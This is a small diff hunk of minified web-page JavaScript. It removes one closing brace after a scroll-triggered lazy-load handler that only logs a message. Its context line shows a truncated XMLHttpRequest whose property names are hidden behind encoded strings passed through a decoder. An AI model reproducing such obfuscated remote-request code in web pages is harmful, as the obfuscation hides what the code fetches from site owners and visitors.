@@ -30,5 +30,5 @@ var xhrRmt=new XMLHttpRequest;xhrRmt[xAR.d("ab25yZWFkeXN0YXRlY2hhbmdl")]=functio
 
 var lazyJsc=!1;window.addEventListener('scroll',function(){(0!=document.documentElement.scrollTop&&!1===lazyJsc||0!=document.body.scrollTop&&!1===lazyJsc)&&(!function(){
 console.log('Lazy Js Scroll - main js');
-}(),lazyJsc=!0)},!0);}
+}(),lazyJsc=!0)},!0);
 /*]]>*/
